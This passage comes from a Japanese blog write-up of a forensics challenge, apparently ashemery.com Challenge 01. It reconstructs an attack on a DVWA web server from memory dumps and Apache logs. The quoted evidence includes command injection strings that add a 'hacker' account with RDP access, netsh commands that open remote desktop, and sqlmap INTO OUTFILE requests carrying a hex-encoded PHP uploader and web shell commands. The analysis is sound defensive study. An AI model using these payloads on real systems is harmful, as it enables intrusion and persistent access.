</span></span></code></pre></div><p>イメージ上では以下画像のアカウントしか残っておらず，<code>user1 [1005]</code>, <code>hacker [1006]</code>は攻撃者が作った後に削除したユーザの様子．</p><p><img loading=lazy src=https://i.imgur.com/8FLmLMo.png></p><h3 id=usnジャーナルの解析>USNジャーナルの解析<a hidden class=anchor aria-hidden=true href=#usnジャーナルの解析>#</a></h3><p><a href=https://www.jpcert.or.jp/event/jsac2018.html>JSAC2018</a>でkazamiyaさんが発表していたUSNAnalyticsを使っていきます．</p><p>余談ですが，JSAC2018聴講しに行ったのですが「これが本当に無料でいいんかい」というくらい充実した良いカンファレンスだったので来年以降もあったら参加したいですね．</p><p><a href=https://www.kazamiya.net/usn_analytics>https://www.kazamiya.net/usn_analytics</a></p><p><img loading=lazy src=https://i.imgur.com/glv8duH.png></p><p>UTCで出したのでこの端末のtimezoneとは−7時間違うので注意する</p><h3 id=調査-1>調査<a hidden class=anchor aria-hidden=true href=#調査-1>#</a></h3><p>rootディレクトリ直下に<code>xampp</code>ディレクトリがあるのでxamppが動いていた様子．</p><h4 id=メモリダンプから調べる>メモリダンプから調べる<a hidden class=anchor aria-hidden=true href=#メモリダンプから調べる>#</a></h4><p>Volatiltiyを使う．
大抵のVolatilityのコマンドはここを見れば分かるので参考．</p><p><a href=https://github.com/volatilityfoundation/volatility/wiki/Command-Reference>Command Reference · volatilityfoundation/volatility Wiki · GitHub</a></p><p>少し前にアップデートされたSANS ForensicsのMemory Forensics Cheat Sheetも参考になる．</p><p><a href=https://digital-forensics.sans.org/media/memory-forensics-cheat-sheet.pdf>https://digital-forensics.sans.org/media/memory-forensics-cheat-sheet.pdf</a></p><p>とりあえずpstreeを調べる．</p><p><code>xampp-control.exe</code>の下に<code>httpd.exe</code>と<code>FileZillaServer</code>と<code>mysqld.exe</code>がぶら下がって稼働していたことが分かる(一部省略)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory]$ vol.py -f memdump.mem --profile=Win2008SP1x86 pstree
</span></span><span style=display:flex><span>Volatility Foundation Volatility Framework 2.6
</span></span><span style=display:flex><span>Name                                                  Pid   PPid   Thds   Hnds Time
</span></span><span style=display:flex><span>-------------------------------------------------- ------ ------ ------ ------ ----
</span></span><span style=display:flex><span>. 0x83faa020:xampp-control.e                         2768    816      2    119 2015-08-23 10:32:17 UTC+0000
</span></span><span style=display:flex><span>.. 0x83e4d7c0:httpd.exe                              2796   2768      1     92 2015-08-23 10:32:21 UTC+0000
</span></span><span style=display:flex><span>... 0x83fd77a8:httpd.exe                             2880   2796    155    483 2015-08-23 10:32:26 UTC+0000
</span></span><span style=display:flex><span>.. 0x83fd5200:FileZillaServer                        2856   2768      5     35 2015-08-23 10:32:25 UTC+0000
</span></span><span style=display:flex><span>.. 0x83f9ec70:mysqld.exe                             2804   2768     23    570 2015-08-23 10:32:23 UTC+0000
</span></span></code></pre></div><p>ポート80, 443がhttpdによって開いていたことを確認</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory]$ vol.py -f memdump.mem --profile=Win2008SP1x86 netscan | grep httpd.exe
</span></span><span style=display:flex><span>Volatility Foundation Volatility Framework 2.6
</span></span><span style=display:flex><span>0x3efccbe8         TCPv4    0.0.0.0:80                     0.0.0.0:0            LISTENING        2796     httpd.exe
</span></span><span style=display:flex><span>0x3efccbe8         TCPv6    :::80                          :::0                 LISTENING        2796     httpd.exe
</span></span><span style=display:flex><span>0x3efcde10         TCPv4    0.0.0.0:443                    0.0.0.0:0            LISTENING        2796     httpd.exe
</span></span><span style=display:flex><span>0x3efcdeb8         TCPv4    0.0.0.0:443                    0.0.0.0:0            LISTENING        2796     httpd.exe
</span></span><span style=display:flex><span>0x3efcdeb8         TCPv6    :::443                         :::0                 LISTENING        2796     httpd.exe
</span></span><span style=display:flex><span>0x3efcdf60         TCPv4    0.0.0.0:80                     0.0.0.0:0            LISTENING        2796     httpd.exe
</span></span></code></pre></div><h3 id=apache-logの確認>Apache logの確認<a hidden class=anchor aria-hidden=true href=#apache-logの確認>#</a></h3><p>Apacheが動いていたようなので，イメージ上からapcheのログを確認する．
<code>[root]/xampp/apache/logs</code></p><p><img loading=lazy src=https://i.imgur.com/nfBPoiG.png></p><h4 id=dvwa>/dvwa/<a hidden class=anchor aria-hidden=true href=#dvwa>#</a></h4><p>SAMから分かった攻撃者と思われるユーザ，user11005], hacker[1006]のユーザ作成時間付近(2015/09/02 09:05:00([UTC))のaccess.logをとりあえず見る．</p><p>※timezoneを調べた際にUTC-7というのが分かったので検索としては-7時間した"2015/09/02 02:&ldquo;を調べた
<img loading=lazy src=https://i.imgur.com/OT1IoKS.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/apache_logs]$ cat access.log| grep 02/Sep/2015:02
</span></span><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:02:02:33 -0700] &#34;POST /dvwa/vulnerabilities/exec/ HTTP/1.1&#34; 200 4934 &#34;http://192.168.56.101/dvwa/vulnerabilities/exec/&#34; &#34;Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0&#34;
</span></span><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:02:03:18 -0700] &#34;POST /dvwa/vulnerabilities/exec/ HTTP/1.1&#34; 200 4934 &#34;http://192.168.56.101/dvwa/vulnerabilities/exec/&#34; &#34;Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0&#34;
</span></span><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:02:04:36 -0700] &#34;POST /dvwa/vulnerabilities/exec/ HTTP/1.1&#34; 200 4934 &#34;http://192.168.56.101/dvwa/vulnerabilities/exec/&#34; &#34;Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0&#34;
</span></span><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:02:05:22 -0700] &#34;POST /dvwa/vulnerabilities/exec/ HTTP/1.1&#34; 200 4971 &#34;http://192.168.56.101/dvwa/vulnerabilities/exec/&#34; &#34;Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0&#34;
</span></span></code></pre></div><p>なにやら<code>/dvwa/vulnerabilities/exec/</code>へPOSTしていることが分かる．</p><p>dvwaを知らなかったのでggりましたが，Damn Vulnerable Web Applicationの略称で，Webアプリケーションセキュリティの教育などに使用されるものらしいです．
<a href=http://www.dvwa.co.uk/>http://www.dvwa.co.uk/</a></p><p>/dvwa/vulnerabilities/exec/はIPを入力するとそこへのPingの結果を返すというもので,以下がそのPHPのコード</p><p><a href=https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/exec/source/low.php>https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/exec/source/low.php</a></p><p><code>$target</code>をそのまま受け取ってshell_execをしているんで<code>IPアドレス ; cat /etc/passwd</code>のような感じで任意のコマンドを実行可能で，このあたりでuser1の作成などをされたのではないかと推測</p><p>DVWAの/dvwa/vulnerabilities/exec/は以下のページで解説をしている</p><p><a href=https://computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson2/index.html>Damn Vulnerable Web App (DVWA): Lesson 2: Command Execution Basic Testing</a></p><h3 id=攻撃者のユーザ作成>攻撃者のユーザ作成<a hidden class=anchor aria-hidden=true href=#攻撃者のユーザ作成>#</a></h3><p>volatilityのcmdscanプラグインを使用して攻撃者がcmd.exeから入力したコマンドを検出する．</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory]$ vol.py -f memdump.mem --profile=Win2008SP1x86 cmdscan
</span></span><span style=display:flex><span>Volatility Foundation Volatility Framework 2.6
</span></span><span style=display:flex><span>**************************************************
</span></span><span style=display:flex><span>CommandProcess: csrss.exe Pid: 524
</span></span><span style=display:flex><span>CommandHistory: 0x5a24708 Application: cmd.exe Flags: Allocated, Reset
</span></span><span style=display:flex><span>CommandCount: 17 LastAdded: 16 LastDisplayed: 16
</span></span><span style=display:flex><span>FirstCommand: 0 CommandCountMax: 50
</span></span><span style=display:flex><span>ProcessHandle: 0x2d8
</span></span><span style=display:flex><span>Cmd #0 @ 0xe907c8: ipconfig
</span></span><span style=display:flex><span>Cmd #1 @ 0xe91af8: cls
</span></span><span style=display:flex><span>Cmd #2 @ 0xe91db0: ipconfig
</span></span><span style=display:flex><span>Cmd #3 @ 0x5a34bd0: net user user1 user1 /add
</span></span><span style=display:flex><span>Cmd #4 @ 0x5a34eb8: net user user1 root@psut /add
</span></span><span style=display:flex><span>Cmd #5 @ 0x5a34c10: net user user1 Root@psut /add
</span></span><span style=display:flex><span>Cmd #6 @ 0x5a24800: cls
</span></span><span style=display:flex><span>Cmd #7 @ 0x5a34c58: net /?
</span></span><span style=display:flex><span>Cmd #8 @ 0x5a34d88: net localgroup /?
</span></span><span style=display:flex><span>Cmd #9 @ 0x5a34f48: net localgroup &#34;Remote Desktop Users&#34; user1 /add
</span></span><span style=display:flex><span>Cmd #10 @ 0x5a34c70: net /?
</span></span><span style=display:flex><span>Cmd #11 @ 0xe911b0: netsh /?
</span></span><span style=display:flex><span>Cmd #12 @ 0xe907e8: netsh firewall /?
</span></span><span style=display:flex><span>Cmd #13 @ 0xe91218: netsh firewall set service type = remotedesktop /?
</span></span><span style=display:flex><span>Cmd #14 @ 0xe91288: netsh firewall set service type = remotedesktop enable
</span></span><span style=display:flex><span>Cmd #15 @ 0xe91300: netsh firewall set service type=remotedesktop mode=enable
</span></span><span style=display:flex><span>Cmd #16 @ 0xe91380: netsh firewall set service type=remotedesktop mode=enable scope=subnet
</span></span><span style=display:flex><span>**************************************************
</span></span><span style=display:flex><span>CommandProcess: csrss.exe Pid: 524
</span></span><span style=display:flex><span>CommandHistory: 0x5a30950 Application: cmd.exe Flags: Allocated, Reset
</span></span><span style=display:flex><span>CommandCount: 2 LastAdded: 1 LastDisplayed: 1
</span></span><span style=display:flex><span>FirstCommand: 0 CommandCountMax: 50
</span></span><span style=display:flex><span>ProcessHandle: 0x7ec
</span></span><span style=display:flex><span>Cmd #0 @ 0xe91970: netsh fireall set service type=remotedesktop mode=enable scope=subnet
</span></span><span style=display:flex><span>Cmd #1 @ 0x5a17b58: netsh firewall set service type=remotedesktop mode=enable scope=subnet
</span></span><span style=display:flex><span>Cmd #38 @ 0x5a30bc8:
</span></span><span style=display:flex><span>Cmd #39 @ 0x5a24890: et.exe
</span></span><span style=display:flex><span>Cmd #48 @ 0x5a24890: et.exe
</span></span><span style=display:flex><span>Cmd #49 @ 0xe91af8: cls
</span></span><span style=display:flex><span>**************************************************
</span></span><span style=display:flex><span>CommandProcess: csrss.exe Pid: 524
</span></span><span style=display:flex><span>CommandHistory: 0x5a30ad0 Application: httpd.exe Flags: Allocated
</span></span><span style=display:flex><span>CommandCount: 0 LastAdded: -1 LastDisplayed: -1
</span></span><span style=display:flex><span>FirstCommand: 0 CommandCountMax: 50
</span></span><span style=display:flex><span>ProcessHandle: 0x3bc
</span></span></code></pre></div><p><code>net user</code>コマンドを使ってuser1を作成し，<code>Remote Desktop Users</code>ローカルグループに追加した後，Windows FireWallでRDPを有効にしていることが分かる．
/dvwa/vulnerabilities/execでOSコマンドインジェクションされて作成されたのかとか想像(仮定)</p><h4 id=メモリイメージからstringsで見る>メモリイメージからStringsで見る<a hidden class=anchor aria-hidden=true href=#メモリイメージからstringsで見る>#</a></h4><p><code>user1</code>が<code>net user</code>コマンドを使って作成されたらしい．
もう一つのアカウント<code>hacker</code>が作られた形跡を探す．
メモリダンプからhttpd.exeのプロセス部分をダンプする</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory]$ vol.py -f memdump.mem --profile=Win2008SP1x86 pslist | grep httpd.exe
</span></span><span style=display:flex><span>Volatility Foundation Volatility Framework 2.6
</span></span><span style=display:flex><span>0x83e4d7c0 httpd.exe              2796   2768      1       92      1      0 2015-08-23 10:32:21 UTC+0000
</span></span><span style=display:flex><span>0x83fd77a8 httpd.exe              2880   2796    155      483      1      0 2015-08-23 10:32:26 UTC+0000
</span></span></code></pre></div><p>プロセスとして動いていたのはPID:2796と2880っぽい．
両方共memdumpする</p><p>2796</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory]$ vol.py -f memdump.mem --profile=Win2008SP1x86 memdump -p 2796 -D 2796
</span></span><span style=display:flex><span>Volatility Foundation Volatility Framework 2.6
</span></span><span style=display:flex><span>************************************************************************
</span></span><span style=display:flex><span>Writing httpd.exe [  2796] to 2796.dmp
</span></span></code></pre></div><p>2880</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory]$ vol.py -f memdump.mem --profile=Win2008SP1x86 memdump -p 2880 -D 2880
</span></span><span style=display:flex><span>Volatility Foundation Volatility Framework 2.6
</span></span><span style=display:flex><span>************************************************************************
</span></span><span style=display:flex><span>Writing httpd.exe [  2880] to 2880.dmp
</span></span></code></pre></div><p>メモリダンプから文字列を抜き出して，ユーザ名<code>hacker</code>で検索</p><p>2796</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory/2796]$ strings 2796.dmp|grep hacker
</span></span><span style=display:flex><span>~^webwhacker.*$~
</span></span><span style=display:flex><span>WebWhacker*
</span></span><span style=display:flex><span>WebWhacker*
</span></span><span style=display:flex><span>WebWhacker
</span></span><span style=display:flex><span>Zp6.102+%26%26+net+user+hacker+hacker+/add&amp;submit=submit
</span></span><span style=display:flex><span>ip=192.168.56.102+%26%26+net+localgroup+%22Remote+Desktop+Users%22+hacker+%2Fadd&amp;submit=submit$
</span></span><span style=display:flex><span>hackerLo
</span></span></code></pre></div><p>2880</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory/2880]$ strings 2880.dmp|grep hacker
</span></span><span style=display:flex><span>~^webwhacker.*$~
</span></span><span style=display:flex><span>WebWhacker*
</span></span><span style=display:flex><span>WebWhacker*
</span></span><span style=display:flex><span>WebWhacker
</span></span><span style=display:flex><span>&lt;center&gt;&lt;b&gt;Owned by hacker&lt;/b&gt;&lt;/center&gt;
</span></span><span style=display:flex><span>&lt;center&gt;&lt;b&gt;Owned by hacker&lt;/b&gt;&lt;/center&gt;
</span></span><span style=display:flex><span>&lt;center&gt;&lt;b&gt;Owned by hacker&lt;/b&gt;&lt;/center&gt;
</span></span><span style=display:flex><span>&lt;center&gt;&lt;b&gt;Owned by hacker&lt;/b&gt;&lt;/center&gt;
</span></span><span style=display:flex><span>&lt;center&gt;&lt;b&gt;Owned by hacker&lt;/b&gt;&lt;/center&gt;
</span></span><span style=display:flex><span>Zp6.102+%26%26+net+user+hacker+hacker+/add&amp;submit=submit
</span></span><span style=display:flex><span>ip=192.168.56.102+%26%26+net+localgroup+%22Remote+Desktop+Users%22+hacker+%2Fadd&amp;submit=submit$
</span></span><span style=display:flex><span>hackerLo
</span></span></code></pre></div><p>両方共下2行で，<code>net user</code>コマンドでユーザ名<code>hacker</code>のユーザが作成され，Remote Desktopのローカルグループに追加されていることが分かる．</p><p><code>ip=192.168.56.102%26%26</code>から始まっていることから，<code>/dvwa/vulnerabilities/exec/</code>のフォームからのOSコマンドインジェクションにより実行されたのでないかと推測．</p><p><a href=https://betweentwodfirns.blogspot.jp/2017/03/ashemerycom-challenge-1-web-server-case.html>Between Two DFIRns: Ashemery.com: Challenge #1 - Web Server Case Write-up</a></p><p>参考にしたここを見たら，<code>%26%26</code>(URLdecodeすると&&)でgrepすると，<code>[IP]+&&+[cmd]</code>形式でプロセスメモリ上に残ったコマンドを検索することが出来るようで，なるほど～となった．</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory/2880]$ strings 2880.dmp|grep %26%26
</span></span><span style=display:flex><span>ip=192.168.56.102+%26%26+dir+C%3A%5Cwindows%5C&amp;submit=submit_
</span></span><span style=display:flex><span>P26.102+%26%26+dir+C%3A%5Cusers%5Cadministrator&amp;submit=submit
</span></span><span style=display:flex><span>Zp6.102+%26%26+net+user+hacker+hacker+/add&amp;submit=submit
</span></span><span style=display:flex><span>ip=192.168.56.102+%26%26+dir&amp;submit=submit
</span></span><span style=display:flex><span>ip=192.168.56.102+%26%26+net+localgroup+%22Remote+Desktop+Users%22+hacker+%2Fadd&amp;submit=submit$
</span></span><span style=display:flex><span>ip=192.168.56.102+%26%26%64%69%72&amp;submit=submit?
</span></span></code></pre></div><h3 id=sqlinjection>SQLinjection<a hidden class=anchor aria-hidden=true href=#sqlinjection>#</a></h3><p>access.logを見ていると，uaがsqlmapからのアクセスが大変に多い．
sqlmapはSQLinjectionのテストツール <a href=http://sqlmap.org/>http://sqlmap.org/</a></p><h4 id=tmpukudkphpとtmpbiwucphp><code>tmpukudk.php</code>と<code>tmpbiwuc.php</code><a hidden class=anchor aria-hidden=true href=#tmpukudkphpとtmpbiwucphp>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/apache_logs]$ cat access.log|grep -e tmpukudk.php -e tmpbiwuc.php
</span></span><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:04:25:52 -0700] &#34;GET /dvwa/vulnerabilities/sqli/?id=2%27%20LIMIT%200%2C1%20INTO%20OUTFILE%20%27%2Fxampp%2Fhtdocs%2Ftmpukudk.php%27%20LINES%20TERMINATED%20BY%200x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d5c5c78616d70705c5c6874646f63735c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a--%20--%20&amp;Submit=Submit HTTP/1.1&#34; 200 4893 &#34;-&#34; &#34;sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)&#34;
</span></span><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:04:25:52 -0700] &#34;GET /xampp/htdocs/tmpukudk.php HTTP/1.1&#34; 403 1206 &#34;-&#34; &#34;sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)&#34;
</span></span><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:04:25:53 -0700] &#34;GET /htdocs/tmpukudk.php HTTP/1.1&#34; 404 1059 &#34;-&#34; &#34;sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)&#34;
</span></span><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:04:25:53 -0700] &#34;GET /tmpukudk.php HTTP/1.1&#34; 200 315 &#34;-&#34; &#34;sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)&#34;
</span></span><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:04:25:53 -0700] &#34;POST /tmpukudk.php HTTP/1.1&#34; 200 25 &#34;-&#34; &#34;Python-urllib/2.7&#34;
</span></span><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:04:26:04 -0700] &#34;GET /tmpbiwuc.php?cmd=dir HTTP/1.1&#34; 200 853 &#34;-&#34; &#34;sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)&#34;
</span></span><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:04:26:23 -0700] &#34;GET /tmpbiwuc.php?cmd=del%20%2FF%20%2FQ%20C%3A%5Cxampp%5Chtdocs%5Ctmpukudk.php HTTP/1.1&#34; 200 11 &#34;-&#34; &#34;sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)&#34;
</span></span><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:04:26:23 -0700] &#34;GET /tmpbiwuc.php?cmd=del%20%2FF%20%2FQ%20%5Cxampp%5Chtdocs%5Ctmpbiwuc.php HTTP/1.1&#34; 200 11 &#34;-&#34; &#34;sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)&#34;
</span></span></code></pre></div><p>URLEncodeされてて微妙に見づらいのでDecodeする．
<code>INTO OUTFILE</code>で<code>/xampp/htdocs/tmpukudk.php</code>を作成していることが分かる．</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:04:25:52 -0700] &#34;GET /dvwa/vulnerabilities/sqli/?id=2&#39; LIMIT 0,1 INTO OUTFILE &#39;/xampp/htdocs/tmpukudk.php&#39; LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d5c5c78616d70705c5c6874646f63735c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a-- -- &amp;Submit=Submit HTTP/1.1&#34; 200 4893 &#34;-&#34; &#34;sqlmap/1.0-dev-nongit-20150902 
</span></span></code></pre></div><p>Pythonのurllibを使って何かしらをPOST．その次に新しい<code>tmpbiwuc.php</code>に対して<code>cmd=echo command execution test</code>とリクエストを投げているので何かしらコマンドを受けて返すスクリプトを投げている様子．WebShellとかですかね．</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:04:25:53 -0700] &#34;POST /tmpukudk.php HTTP/1.1&#34; 200 25 &#34;-&#34; &#34;Python-urllib/2.7&#34;
</span></span><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:04:25:53 -0700] &#34;GET /tmpbiwuc.php?cmd=echo%20command%20execution%20test HTTP/1.1&#34; 200 36 &#34;-&#34; &#34;sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)&#34;
</span></span></code></pre></div><p>その後は<code>tmpbiwuc.php</code>経由で<code>tmpukudk.php</code>と自身をdelコマンドで削除している．</p><h4 id=2>2<a hidden class=anchor aria-hidden=true href=#2>#</a></h4><p>上と大体同じ</p><p><code>tmpudvfh.php</code>をドロップして，<code>tmpbrjvl.php</code>をPython経由でアップロード，その後に削除．</p><p>URLDecode済み</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/apache_logs]$ cat access.log|grep -e tmpudvfh.php -e tmpbrjvl.php
</span></span><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:23:52:24 -0700] &#34;GET /dvwa/vulnerabilities/sqli/?id=2&#39; LIMIT 0,1 INTO OUTFILE &#39;/xampp/htdocs/tmpudvfh.php&#39; LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d5c5c78616d70705c5c6874646f63735c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a-- -- &amp;Submit=Submit HTTP/1.1&#34; 200 4893 &#34;-&#34; &#34;sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)&#34;
</span></span><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:23:52:24 -0700] &#34;GET /xampp/htdocs/tmpudvfh.php HTTP/1.1&#34; 403 1206 &#34;-&#34; &#34;sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)&#34;
</span></span><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:23:52:24 -0700] &#34;GET /htdocs/tmpudvfh.php HTTP/1.1&#34; 404 1059 &#34;-&#34; &#34;sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)&#34;
</span></span><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:23:52:24 -0700] &#34;GET /tmpudvfh.php HTTP/1.1&#34; 200 315 &#34;-&#34; &#34;sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)&#34;
</span></span><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:23:52:24 -0700] &#34;POST /tmpudvfh.php HTTP/1.1&#34; 200 25 &#34;-&#34; &#34;Python-urllib/2.7&#34;
</span></span><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:23:52:24 -0700] &#34;GET /tmpbrjvl.php?cmd=echo command execution test HTTP/1.1&#34; 200 36 &#34;-&#34; &#34;sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)&#34;
